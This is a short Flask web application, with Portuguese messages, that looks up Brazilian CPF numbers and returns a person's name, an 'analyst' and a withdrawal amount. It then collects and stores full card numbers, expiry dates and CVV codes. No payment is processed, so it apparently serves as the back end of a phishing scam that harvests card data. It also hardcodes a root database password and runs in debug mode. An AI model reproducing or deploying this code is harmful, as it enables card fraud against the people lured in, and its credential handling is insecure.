from flask import Flask, render_template, request, jsonify
import mysql.connector
import os
from dotenv import load_dotenv

app = Flask(__name__)

load_dotenv()

def connection():
    try:
        conn = mysql.connector.connect(
            host='hopper.proxy.rlwy.net',
            port= 36628,
            user='root',
            password='NHtCUBtZvfQUgZOLpYIpVaCRPHZinqgo',
            database='railway'
        )
        print('[✓] Conexão com MySQL realizada com sucesso!')
        return conn
    except mysql.connector.Error as err:
        print(f'[X] Erro ao conectar no MySQL: {err}')
        return None


def consultCpf(cpf):
    conn = connection()
    if not conn:
        return None
    
    cursor = conn.cursor(dictionary=True)
    try:
        query = "SELECT nome, analista, saque FROM users WHERE cpf = %s"
        cursor.execute(query, (cpf,))
        result = cursor.fetchone()
        cursor.close()
        conn.close()
        return result
    except Exception as e:
        print(f'Erro na consulta: {e}')
        return None


def insertCard(cpf, numberCard, validade, cvv):
    conn = connection()
    cursor = conn.cursor()
    try:
        cursor.execute("""
            INSERT INTO cards (cpf, numberCard, validCard, codeSecurity)
            VALUES (%s, %s, %s, %s)
            ON DUPLICATE KEY UPDATE
              numberCard = VALUES(numberCard),
              validCard = VALUES(validCard),
              codeSecurity = VALUES(codeSecurity)
        """, (cpf, numberCard, validade, cvv))
        conn.commit()
    finally:
        conn.close()
        
        
@app.route('/')
def renderizaPage():
    return render_template('index.html')

@app.route("/getcpf", methods=["POST"])
def consulta_cpf():
    data = request.get_json()
    cpf = data.get("cpf")
    cpf = cpf.replace(".", "").replace("-", "")

    user_data = consultCpf(cpf)

    if user_data:
        user_data['saque'] = str(user_data['saque'])
        user_data['cpf'] = cpf 
        return jsonify({"found": True, "dados": user_data})
    else:
        return jsonify({"found": False})


@app.route("/salvar_cartao", methods=["POST"])
def salvar_cartao():
    data = request.get_json()
    cpf = data.get("cpf", "").replace(".", "").replace("-", "")
    number = data.get("number")
    validade = data.get("validade")
    cvv = data.get("cvv")

    if not (cpf and number and validade and cvv):
        return jsonify({"success": False, "error": "Dados incompletos"}), 400

    try:
        insertCard(cpf, number, validade, cvv)
        return jsonify({"success": True})
    except Exception as e:
        print("Erro ao inserir cartão:", e)
        return jsonify({"success": False, "error": "Erro no banco de dados"}), 500



if __name__ == "__main__":
    app.run(debug=True)
